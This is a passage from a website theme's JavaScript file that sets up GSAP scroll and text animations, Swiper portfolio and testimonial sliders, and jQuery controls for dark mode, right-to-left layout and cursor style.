      scale: 1,
      opacity: 1,
      rotateX: 0,
    })
  });

  gsap.to(".bg_image img", {
    xPercent: -18,
    scrollTrigger: {
      trigger: ".portfolio__area",
      start: "top top",
      end: "bottom center",
      pin: ".bg_image",
      scrub: 3
    }
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 39. Portfolio Slider 2
  var portfolio_slider = new Swiper(".portfolio__slider-2", {
    slidesPerView: 1,
    spaceBetween: 0,
    effect: "fade",
    speed: 1500,
    loop: true,
    autoplay: {
      delay: 5000,
      disableOnInteraction: false
    },
    pagination: {
      el: ".swiper-pagination",
      clickable: true,
      renderBullet: function (i, className) {
        return `
        <button class="${className}">
          <svg class="circle-progress"><circle class="circle-origin" r="24.5" cx="25" cy="25"></circle></svg><span></span>
        </button>
      `;
      }
    }
  });

  var portfolio_project_thumbs = new Swiper(".portfolio__project-thumbs", {
    loop: true,
    spaceBetween: 0,
    slidesPerView: 1,
    freeMode: true,
    watchSlidesProgress: true,
    allowTouchMove: false,
  });
  var portfolio_project = new Swiper(".portfolio__project-slider", {
    loop: true,
    spaceBetween: 10,
    navigation: {
      nextEl: ".pp-next",
      prevEl: ".pp-prev",
    },
    thumbs: {
      swiper: portfolio_project_thumbs,
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 40. Portfolio Slider 3
  var portfolio_slider_3 = new Swiper(".portfolio__slider-3", {
    speed: 1500,
    loop: true,
    effect: 'fade',
    autoplay: {
      delay: 5000,
      disableOnInteraction: false
    },
    pagination: {
      el: ".swiper-pagination",
      type: "fraction",
    },
    navigation: {
      nextEl: ".pp-next",
      prevEl: ".pp-prev",
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 41. Image Moving Animations

  // Service Page 
  let image_list = [".solution__wrapper img"]
  imageMoving(".solution__area", image_list)

  // Home Page Client
  imageMoving(".testimonial__area", ".testimonial__img img")

  // Testimonial 3
  imageMoving(".testimonial__area-3", ".testimonial__area-3 img")

  // Image Moving with Cursor Function
  function imageMoving(wrapper, image_list) {
    let container = document.querySelector(wrapper)
    try {
      if (container) {
        container.addEventListener("mousemove", (e) => {

          var x = e.clientX
          var y = e.clientY
          let viewportWidth = window.innerWidth;
          let viewportHeight = window.innerHeight;
          let center = viewportWidth / 2
          let centerHeight = innerHeight / 2

          if (x > center) {
            gsap.to(image_list, {
              x: 15,
              duration: 5,
              ease: "power4.out"
            })
          }
          else {
            gsap.to(image_list, {
              x: -15,
              duration: 5,
              ease: "power4.out"
            })
          }
          if (y > centerHeight) {
            gsap.to(image_list, {
              y: 15,
              duration: 5,
              ease: "power4.out"
            })
          }
          else {
            gsap.to(image_list, {
              y: -15,
              duration: 5,
              ease: "power4.out"
            })
          }
        });
      }
    }
    catch (err) {
      console.log(err)
    }
  }
  /////////////////////////////////////////////////////




  imageMovingPortfolio(".portfolio-section", ".portfolio__hero img")

  // Image Moving with Cursor Function
  function imageMovingPortfolio(wrapper, image_list) {
    let container = document.querySelector(wrapper)
    try {
      if (container) {
        container.addEventListener("mousemove", (e) => {

          var x = e.clientX
          var y = e.clientY
          let viewportWidth = window.innerWidth;
          let viewportHeight = window.innerHeight;
          let center = viewportWidth / 2
          let centerHeight = innerHeight / 2

          if (x > center) {
            gsap.to(image_list, {
              x: 60,
              duration: 5,
              ease: "power4.out"
            })
          }
          else {
            gsap.to(image_list, {
              x: -60,
              duration: 5,
              ease: "power4.out"
            })
          }
          if (y > centerHeight) {
            gsap.to(image_list, {
              scale: 1.15,
              duration: 5,
              ease: "power4.out"
            })
          }
          else {
            gsap.to(image_list, {
              scale: 1,
              duration: 5,
              ease: "power4.out"
            })
          }
        });
      }
    }
    catch (err) {
      console.log(err)
    }
  }



  /////////////////////////////////////////////////////
  // 42. Counter Animation
  gsap.set(".counter_animation .counter__anim", { y: -100, opacity: 0, })
  if (device_width < 1023) {
    const counterArray = gsap.utils.toArray(".counter_animation .counter__anim")
    counterArray.forEach((item, i) => {
      let counterTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      counterTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "bounce",
        duration: 1.5,
      })
    })
  }
  else {

    gsap.to(".counter_animation .counter__anim", {
      scrollTrigger: {
        trigger: ".counter_animation",
        start: "top center+=300",
      },
      y: 0,
      opacity: 1,
      ease: "bounce",
      duration: 1.5,
      stagger: {
        each: 0.3,
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 43. Workflow Slider Animation | animation__fade
  gsap.set(".fade_left", { x: -20, opacity: 0, })
  gsap.to(".fade_left", {
    scrollTrigger: {
      trigger: ".fade_left",
      start: "top center+=300",
    },
    x: 0,
    opacity: 1,
    ease: "power2.out",
    duration: 1,
    stagger: {
      each: 0.2,
    }
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 44. Workflow Slider Animation 2 |  fade_bottom
  gsap.set(".fade_bottom", { y: 30, opacity: 0 });

  if (device_width < 1023) {
    const fadeArray = gsap.utils.toArray(".fade_bottom")
    fadeArray.forEach((item, i) => {
      let fadeTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      fadeTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".fade_bottom", {
      scrollTrigger: {
        trigger: ".fade_bottom",
        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1,
      stagger: {
        each: 0.2
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 45. Blog animation 
  gsap.set(".blog__animation .blog__item", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".blog__animation .blog__item")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".blog__animation .blog__item", {
      scrollTrigger: {
        trigger: ".blog__animation .blog__item",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 46. Blog animation 2
  gsap.set(".blog__animation .blog__item-2", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".blog__animation .blog__item-2")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".blog__animation .blog__item-2", {
      scrollTrigger: {
        trigger: ".blog__animation .blog__item-2",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 47. Blog Animation 3
  gsap.set(".blog__animation .blog__item-3", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".blog__animation .blog__item-3")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".blog__animation .blog__item-3", {
      scrollTrigger: {
        trigger: ".blog__animation .blog__item-3",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 48. Zoom In Animation
  gsap.set(".zoom_in", { opacity: 0, y: 30, scale: 0.5, });
  gsap.to(".zoom_in", {
    scrollTrigger: {
      trigger: ".zoom_in",
      start: "top center+=200",
      markers: false
    },
    y: 0,
    opacity: 1,
    scale: 1,
    ease: "power2.out",
    duration: 1,
    stagger: {
      each: 0.2
    }
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 49. Service 3 Animation 
  let service__items_3 = gsap.utils.toArray(".service_animation")
  let service__items_heading = gsap.utils.toArray(".service_animation h3")
  let service__items_content = gsap.utils.toArray(".service_animation .service__content-3")

  service__items_3.forEach((service_item, i) => {
    gsap.set([service__items_heading[i], service__items_content[i]], {
      x: -30,
      opacity: 0,
    })

    let service3_timeline = gsap.timeline({
      scrollTrigger: {
        trigger: service_item,
        start: "top center+=200",
        markers: false
      }
    })

    service3_timeline.to(service__items_heading[i], {
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1.5,
      stagger: {
        each: 0.2
      }
    })
    service3_timeline.to(service__items_content[i], {
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1.5,
      stagger: {
        each: 0.2
      }
    }, "-=1")
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////  
  // 50. Testimonial 2 Animation 
  gsap.set(".testimonial__inner-2", {
    opacity: 0,
    x: -100
  });

  gsap.to(".testimonial__inner-2", {
    scrollTrigger: {
      trigger: ".testimonial__slider-wrapper-2",
      start: "top center+=100",
      end: "bottom bottom",
    },
    opacity: 1,
    x: 0,
    duration: 1
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 51. Testimonial 3 Image Animation
  gsap.set(".animation_image_zoom img", { opacity: 0, scale: 0.5 });

  gsap.to(".animation_image_zoom img", {
    scrollTrigger: {
      trigger: ".testimonial__area-3",
      start: "top center+=200",
      markers: false
    },
    opacity: 1,
    scale: 1,
    x: 20,
    ease: "power2.out",
    duration: 2.5,
    stagger: {
      each: 0.3
    }
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 52. Pricing Table Animation 
  let pricing_timeline = gsap.timeline({
    scrollTrigger: {
      trigger: ".price__table",
      start: "top center",
    }
  })

  gsap.set(".animation_from_bottom", { yPercent: 50 })

  pricing_timeline.to(".animation_from_bottom", {
    yPercent: 0,
    duration: 2,
    ease: "power4.out",
  })

  gsap.set(".animation_from_top", { yPercent: -50, opacity: 0 })
  pricing_timeline.to(".animation_from_top", {
    yPercent: 0,
    duration: 2,
    opacity: 1,
    ease: "power4.out",
  }, "-=2")
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 53. Service 2 Animation 
  let animation__services2 = gsap.utils.toArray(".animation__service-2 .service__item-2")
  gsap.set(animation__services2, {
    opacity: 0,
    x: -30,
  })

  if (animation__services2) {
    if (device_width < 1023) {
      animation__services2.forEach((item, i) => {
        gsap.to(item, {
          scrollTrigger: {
            trigger: item,
            start: "top center+=200",
            markers: false
          },
          opacity: 1,
          x: 0,
          ease: "power2.out",
          duration: 2,
          stagger: {
            each: 0.4
          }
        })
      })
    }
    else {
      gsap.to(".animation__service-2 .service__item-2", {
        scrollTrigger: {
          trigger: ".animation__service-2",
          start: "top center+=200",
          markers: false
        },
        opacity: 1,
        x: 0,
        ease: "power2.out",
        duration: 2,
        stagger: {
          each: 0.4
        }
      })
    }
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 54. Hero 1 Animation
  // if (document.querySelector(".animation__hero_one")) {
  //   let heroOnetl = gsap.timeline()
  //   gsap.set(".animation__hero_one .experience", {
  //     y: 50,
  //     opacity: 0,
  //   })

  //   // animation__hero_one a
  //   let split_char_btn = new SplitText(".animation__hero_one a", { type: "chars, words" })
  //   heroOnetl.from(split_char_btn.words, { duration: 1, x: -50, opacity: 0, autoAlpha: 0, stagger: 0.1 });

  //   //hero__title
  //   let split_char_hero = new SplitText(".hero__title", { type: "chars, words" })
  //   heroOnetl.from(split_char_hero.chars, { duration: 1, x: 70, opacity: 0, autoAlpha: 0, stagger: 0.1 }, '-=1');

  //   //hero__Sub_title
  //   let split_char_hero_subtitle = new SplitText(".animation__hero_one .hero__sub-title", { type: "words" })
  //   heroOnetl.from(split_char_hero_subtitle.words, { duration: 1, x: 50, opacity: 0, autoAlpha: 0, stagger: 0.07 }, '-=1.5');

  //   // heroOnetl.to(".animation__hero_one .hero__sub-title", {
  //   //   y: 0,
  //   //   opacity: 1,
  //   //   duration: 2,
  //   //   ease: "power2.out"
  //   // }, '-=1.5')

  //   heroOnetl.to(".animation__hero_one .experience", {
  //     y: 0,
  //     opacity: 1,
  //     duration: 2,
  //     ease: "power2.out"
  //   }, '-=1.5')
  // }












  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 55. Service 1 Animation
  let home1_services = gsap.utils.toArray(".animation_home1_service")
  let service__number = gsap.utils.toArray(".animation_home1_service .service__number span")
  let service__title = gsap.utils.toArray(".animation_home1_service .service__title")
  let service__text = gsap.utils.toArray(".animation_home1_service .service__text p")
  let service__link = gsap.utils.toArray(".animation_home1_service .service__link p")

  home1_services.forEach((service, i) => {
    gsap.set([service__number[i], service__title[i], service__text[i], service__link[i]], { opacity: 0, x: -50 })

    let home1ServiceTl = gsap.timeline({
      scrollTrigger: {
        trigger: service,
        start: "top center+=300",
        end: "bottom bottom",
        markers: false
      },
    })

    home1ServiceTl.to(service__number[i], {
      x: 0,
      opacity: 1,
      duration: 1.2
    })
    home1ServiceTl.to(service__title[i], {
      x: 0,
      opacity: 1,
      duration: 1.2
    }, "-=1")
    home1ServiceTl.to(service__text[i], {
      x: 0,
      opacity: 1,
      duration: 1.2
    }, "-=1")
    home1ServiceTl.to(service__link[i], {
      x: 0,
      opacity: 1,
      duration: 1.2
    }, "-=1")
  })
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////  
  // 56. Features 2 Animation 
  let animation__feature2 = gsap.utils.toArray(".animation__feature2 .feature__item")
  if (device_width < 1023) {
    animation__feature2.forEach((item, i) => {
      gsap.set(item, { opacity: 0, y: 60 })
      let featured2Timeline = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200"
        }
      })
      featured2Timeline.to(item, {
        opacity: 1,
        y: 0,
        duration: 1.5,
        ease: "power4.out"
      })
    })
  }
  else {
    gsap.set(".animation__feature2 .feature__item", { opacity: 0, y: 40 })
    gsap.to(".animation__feature2 .feature__item", {
      scrollTrigger: {
        trigger: ".animation__feature2",
        start: "top center+=200"
      },
      opacity: 1,
      y: 0,
      duration: 2,
      ease: "power4.out",
      stagger: 0.3
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 57. Portfolio 6 Animation 
  const portfolio_listss = gsap.utils.toArray(".portfolio__item-6 img")
  if (portfolio_listss) {
    portfolio_listss.forEach((item, i) => {
      gsap.from(item, {
        scrollTrigger: {
          trigger: item,
          start: "top center",
          scrub: 1.5,
        },
        scale: 2.5,
        duration: 1,
      })
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 58. Portfolio 5 Border
  let total_portfolio_items = document.querySelectorAll(".portfolio__item-5")
  let total_row = Math.ceil(total_portfolio_items.length / 3)

  let border_row = document.getElementById("items__border")
  for (let i = 0; i < total_row; i++) {
    border_row.innerHTML += '<span class="sec-line"></span> '
  }

  let row_height = 100 / total_row
  var total_lines = document.querySelectorAll("#items__border .sec-line")

  total_lines.forEach((item, i) => {
    let counter = i + 1
    item.style.top = `${row_height * counter}%`;
    item.style.opacity = 1;
  })
  /////////////////////////////////////////////////////



  // Charchater Come Animation 
  let char_come = document.querySelectorAll(".animation__char_come")

  char_come.forEach((char_come) => {
    let split_char = new SplitText(char_come, { type: "chars, words" })
    gsap.from(split_char.chars, { duration: 1, x: 70, autoAlpha: 0, stagger: 0.05 });
  })


  // Charchater Come long Animation 
  let char_come_long = document.querySelectorAll(".animation__char_come_long")

  char_come_long.forEach((char_come) => {
    let split_char = new SplitText(char_come, { type: "chars, words" })
    gsap.from(split_char.chars, { duration: 1, x: 70, autoAlpha: 0, stagger: 0.15 });
  })


  // Charchater Up Animation 
  let char_up = document.querySelector(".animation__char_up")
  let split_char_up = new SplitText(char_up, { type: "chars, words" })
  gsap.from(split_char_up.chars, { duration: 1, y: 15, autoAlpha: 0, stagger: 0.05 });



  // Service Page hero Animation 
  let word_up = document.querySelector(".animation__word_up")
  let split_word_up = new SplitText(word_up, { type: "words", position: "absolute" })
  gsap.from(split_word_up.words, { duration: 1, y: 50, autoAlpha: 0, stagger: 0.05 });

  // Service Page hero Animation   
  let word_come = document.querySelectorAll(".animation__word_come")
  word_come.forEach((word_come) => {
    let split_word_come = new SplitText(word_come, { type: "chars words", position: "absolute" })
    gsap.from(split_word_come.words, { duration: 1, x: 50, autoAlpha: 0, stagger: 0.05 });
  })

  // Service Page hero Animation   
  let word_come_long = document.querySelectorAll(".animation__word_come_long")
  word_come_long.forEach((word_come_long) => {
    let split_word_come_long = new SplitText(word_come_long, { type: "chars words", position: "absolute" })
    gsap.from(split_word_come_long.words, { duration: 1, x: 50, autoAlpha: 0, stagger: 0.5 });
  })


  // Home page Hero Animation 

  /////////////////////////////////////////////////////
  //  Service Page Animation 
  let animation__service_page = gsap.utils.toArray(".animation__service_page")
  if (animation__service_page) {
    animation__service_page.forEach((item, i) => {
      gsap.from(item, {
        scrollTrigger: {
          trigger: item,
          start: "top center+=20%",
          markers: false,
        },
        opacity: 0,
        x: -50,
        ease: "power2.out",
        duration: 2,
      })
    })

  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 59. Portfolio Main Slider
  var breakpoint = window.matchMedia('( max-width: 1300px )');
  var pp_main_wrap = document.querySelector('.portfolio__main-slider');

  if (pp_main_wrap) {
    var enableSwiper = function () {
      var pp_main = new Swiper(".portfolio__main-slider", {
        allowTouchMove: false,
        slidesPerView: 1,
        spaceBetween: 0,
        mousewheel: true,
        effect: "fade",
        pagination: {
          el: ".swiper-pagination",
          clickable: true,
        }
      });
    };

    var breakpointChecker = function () {
      if (breakpoint.matches === true) {
        if (pp_main !== undefined) pp_main.destroy(true, true);
        return;
      } else if (breakpoint.matches === false) {
        return enableSwiper();
      }
    };

    breakpoint.addListener(breakpointChecker);
    breakpointChecker();
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 60. Portfolio Slider 6
  var portfolio_slider_6 = new Swiper(".portfolio__slider-4", {
    speed: 1500,
    loop: true,
    slidesPerView: 1,
    spaceBetween: 15,
    breakpoints: {
      768: {
        slidesPerView: 2,
      },
      1000: {
        slidesPerView: 2,
        spaceBetween: 60,
      },
      1200: {
        slidesPerView: 2,
        spaceBetween: 90,
      },
      1400: {
        slidesPerView: 2,
        spaceBetween: 120,
      },
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 61. Testimonial Slider 4

  var testimonial_slider_4 = new Swiper(".testimonial__slider-4", {
    spaceBetween: 20,
    loop: true,
    freemode: true,
    slidesPerView: 3,
    speed: 2000,
    pagination: {
      el: ".pagination",
      type: "fraction",
    },
    navigation: {
      nextEl: ".next-button",
      prevEl: ".prev-button",
    },
    breakpoints: {
      0: {
        slidesPerView: 1,
      },
      768: {
        slidesPerView: 2,
      },
      1024: {
        slidesPerView: 3,
      }
    }
  });
  /////////////////////////////////////////////////////


  // Switcher JS
  $('#switcher_open').on('click', function () {
    $(this).hide();
    $('#switcher_close').show();
    $('.switcher__icon').css('right', '280px');
    $('.switcher__items').css({
      'right': '0',
    });
  });

  $('#switcher_close').on('click', function () {
    $(this).hide();
    $('#switcher_open').show();
    $('.switcher__icon').css('right', '0');
    $('.switcher__items').css({
      'right': '-280px',
    });
  });

  // Mode JS
  $('.mode-type button').on('click', function (e) {
    $(this).addClass('active').siblings().removeClass('active');

    var mode_val = $('.mode-type button.active').attr('data-mode');
    if (mode_val == 'dark') {
      $('body').addClass('dark');
    } else {
      $('body').removeClass('dark');
    }
  });

  // Language JS
  $('.lang_dir button').on('click', function (e) {
    $(this).addClass('active').siblings().removeClass('active');

    var dir_val = $('.lang_dir button.active').attr('data-mode');
    if (dir_val == 'rtl') {
      $('body').addClass('dir-rtl');
    } else {
      $('body').removeClass('dir-rtl');
    }
  });

  // Cursor JS
  $('#cursor_style').on('change', function () {
    var cursor_val = $(this).val();

    if (cursor_val == '1') {
      $('.cursor1').hide();
      $('.cursor2').hide();
    } else {
      $('.cursor1').show();
      $('.cursor2').show();
    }
  });


  /////////////////////////////////////////////////////
  // 62. Team 7
  const team_item_7 = document.querySelectorAll(".team__item-7");

  function teamImageAnimation(event, team_item_7) {
    const contentBox = team_item_7.getBoundingClientRect();
    const dx = event.clientX - contentBox.x;
    const dy = event.clientY - contentBox.y;
    team_item_7.children[3].style.transform = `translate(${dx}px, ${dy}px)`;
  }

  team_item_7.forEach((item, i) => {
    item.addEventListener("mousemove", (event) => {
      setInterval(teamImageAnimation(event, item), 1000);
    });
  });
  ///////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 63. Portfolio Slider 7
  var portfolio_slider_7 = new Swiper(".portfolio__slider-7", {
    loop: true,
    freemode: true,
    slidesPerView: 1,
    spaceBetween: 30,
    centeredSlides: true,
    speed: 2000,
    breakpoints: {
      640: {
        slidesPerView: 2,
      },
      800: {
        slidesPerView: 2,
        spaceBetween: 50,
      },
      1200: {
        slidesPerView: 3,
        spaceBetween: 70,
      },
    },
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 64. Header 7
  let header_bg_7 = document.querySelector(".header__area-7");
  if (header_bg_7) {
    window.onscroll = function () {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        header_bg_7.classList.add("sticky-7");
        if (scroll_top) {
          scroll_top.style.display = "block";
        }
      } else {
        header_bg_7.classList.remove("sticky-7");
        if (scroll_top) {
          scroll_top.style.display = "none";
        }
      }
    };
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 65. Service 7 Animation 
  let animation_services_7 = gsap.utils.toArray(".animation_service_7 .service__item-7")
  gsap.set(animation_services_7, {
    opacity: 0,
    x: -30,
  })

  if (animation_services_7) {
    if (device_width < 1023) {
      animation_services_7.forEach((item, i) => {
        gsap.to(item, {
          scrollTrigger: {
            trigger: item,
            start: "top center+=200",
            markers: false
          },
          opacity: 1,
          x: -0,
          ease: "power2.out",
          duration: 2,
          stagger: {
            each: 0.4
          }
        })
      })
    }
    else {
      gsap.to(".animation_service_7 .service__item-7", {
        scrollTrigger: {
          trigger: ".animation_service_7",
          start: "top center+=200",
          markers: false
        },
        opacity: 1,
        x: 0,
        ease: "power2.out",
        duration: 2,
        stagger: {
          each: 0.4
        }
      })
    }
  }
  /////////////////////////////////////////////////////



  /////////////////////////////////////////////////////
  // 65. Service 7 Animation 
  let animation_workflow_6 = gsap.utils.toArray(".animation_workflow_6 .workflow__item-4")
  if (animation_workflow_6) {
    if (device_width < 1023) {
      animation_workflow_6.forEach((item, i) => {
        gsap.from(item, {
          scrollTrigger: {
            trigger: item,
            start: "top center+=200",
            markers: false
          },
          opacity: 0,
          x: -30,
          ease: "power2.out",
          duration: 2,
          stagger: {
            each: 0.4
          }
        })
      })
    }
    else {
      gsap.from(".animation_workflow_6 .workflow__item-4", {
        scrollTrigger: {
          trigger: ".animation_workflow_6",
          start: "top center+=200",
          markers: false
        },
        opacity: 0,
        x: -30,
        ease: "power2.out",
        duration: 2,
        stagger: {
          each: 0.4
        }
      })
    }
  }
  /////////////////////////////////////////////////////



  /////////////////////////////////////////////////////
  // 66. Blog Animation 3
  gsap.set(".blog__animation .blog__item-4", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".blog__animation .blog__item-4")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".blog__animation .blog__item-4", {
      scrollTrigger: {
        trigger: ".blog__animation .blog__item-4",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////////

  // Home One Hero Animation 
  let HomeDigital = gsap.timeline()
  let HomeDigitalImage = gsap.timeline()

  let hero7_thum_anim = document.querySelector(".hero7__thum-anim")
  if (hero7_thum_anim) {
    let hero7_thumb_1 = document.querySelector(".image-1")
    let hero7_thumb_2 = document.querySelector(".image-2")
    let hero7_thumb_3 = document.querySelector(".image-3")
    let hero7_thumb_4 = document.querySelector(".image-4")

    gsap.from(".image-1", {
      x: 65,
      yPercent: 100,
      opacity: 0,
      duration: 2,
      delay: 1
    })

    gsap.from(".image-2", {
      delay: 1.5,
      scale: 0,
      duration: 1.5
    })

    gsap.from(".image-3", {
      x: 65,
      yPercent: -100,
      duration: 2,
      opacity: 0,
      delay: 1
    })
    gsap.from(".image-4", {
      xPercent: -100,
      yPercent: -100,
      duration: 2,
      opacity: 0,
      delay: 1
    })

  }


  // Charchater Come long Animation 
  let mark = document.querySelector(".hero__area-3 .title-left")
  let eting = document.querySelector(".hero__area-3 .title-right")
  let hero__text_animation = document.querySelector(".hero__text-animation")


  let split_creatives = new SplitText(mark, { type: "chars" })
  let split_solutions = new SplitText(eting, { type: "chars" })
  let split_text_animation = new SplitText(hero__text_animation, { type: "chars words" })

  HomeDigital.from(split_creatives.chars, { duration: 2, x: 100, autoAlpha: 0, stagger: 0.2 });
  HomeDigital.from(split_solutions.chars, { duration: 1, x: 100, autoAlpha: 0, stagger: 0.1 }, "-=1");
  HomeDigital.from(split_text_animation.words, { duration: 1, x: 50, autoAlpha: 0, stagger: 0.05 }, "-=1");



  // Home page Hero Animation 
  let homeCreative = gsap.timeline()

  // Charchater Come long Animation 
  let creative = document.querySelector(".service__hero-right-2 .creative")
  let solution = document.querySelector(".service__hero-right-2 .solution")
  let heroContent = document.querySelector(".service__hero-right-2 .animate_content")


  let split_creative = new SplitText(creative, { type: "chars" })
  let split_solution = new SplitText(solution, { type: "chars" })
  let split_herocontent = new SplitText(heroContent, { type: "chars words" })

  homeCreative.from(split_creative.chars, { duration: 1, x: 70, autoAlpha: 0, stagger: 0.1 });
  homeCreative.from(split_solution.chars, { duration: 1, x: 70, autoAlpha: 0, stagger: 0.1 }, "-=1.5");
  homeCreative.from(split_herocontent.words, { duration: 1, x: 50, autoAlpha: 0, stagger: 0.05 }, "-=1");


  // Home page Hero Animation 
  gsap.set(".experience", {
    y: 50,
    opacity: 0,
  })
  let homeAgency = gsap.timeline()

  // Charchater Come long Animation 
  let hero__title = document.querySelector(".hero__title")
  let hero__subtitle = document.querySelector(".hero__sub-title")


  let split_hero__title = new SplitText(hero__title, { type: "chars" })
  let split_hero__subtitle = new SplitText(hero__subtitle, { type: "chars words" })

  homeAgency.from(split_hero__title.chars, { duration: 1, x: 70, autoAlpha: 0, stagger: 0.1 });
  homeAgency.from(split_hero__subtitle.words, { duration: 1, x: 50, autoAlpha: 0, stagger: 0.05 }, "-=1");

  homeAgency.to(".experience", {
    y: 0,
    opacity: 1,
    duration: 2,
    ease: "power2.out"
  }, '-=1.5')



  // Home 6 Hero Animation 
  let homeStratup = gsap.timeline()

  // Charchater Come long Animation 
  let hero6_title = document.querySelector(".hero__six_anim .hero__title-6")
  let hero6_desc = document.querySelector(".hero__six_anim p")

  let hero6_button = document.querySelector(".hero__six_anim a")
  let hero6_image = document.querySelector(".hero__right-6 img")

  gsap.set(hero6_image, {
    opacity: 0,
    y: 50
  })
  gsap.set(hero6_button, {
    opacity: 0,
    y: 50
  })


  let split_hero6_title = new SplitText(hero6_title, { type: "chars" })
  let split_hero6_desc = new SplitText(hero6_desc, { type: "chars words" })

  homeStratup.from(split_hero6_title.chars, { duration: 1, x: 70, autoAlpha: 0, stagger: 0.1 });
  homeStratup.from(split_hero6_desc.words, { duration: 1, x: 50, autoAlpha: 0, stagger: 0.05 }, "-=1");
  homeStratup.to(hero6_button, { opacity: 1, y: 0, duration: 1, ease: "power2.out" }, "-=1.5")
  homeStratup.to(hero6_image, { opacity: 1, y: 0, duration: 1, ease: "power2.out" }, "-=1")



  /////////////////////////////////////////////////////
  // 67. Workflow Slider Animation |  fade_bottom 2
  gsap.set(".fade_bottom_2", { y: 30, opacity: 0 });

  if (device_width < 1023) {
    const fadeArray = gsap.utils.toArray(".fade_bottom_2")
    fadeArray.forEach((item, i) => {
      let fadeTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      fadeTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".fade_bottom_2", {
      scrollTrigger: {
        trigger: ".fade_bottom_2",
        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1,
      stagger: {
        each: 0.2
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 68. Workflow Slider Animation 2 |  fade_bottom
  gsap.set(".fade_bottom_3", { y: 30, opacity: 0 });

  if (device_width < 1023) {
    const fadeArray = gsap.utils.toArray(".fade_bottom_3")
    fadeArray.forEach((item, i) => {
      let fadeTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      fadeTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".fade_bottom_3", {
      scrollTrigger: {
        trigger: ".fade_bottom_3",
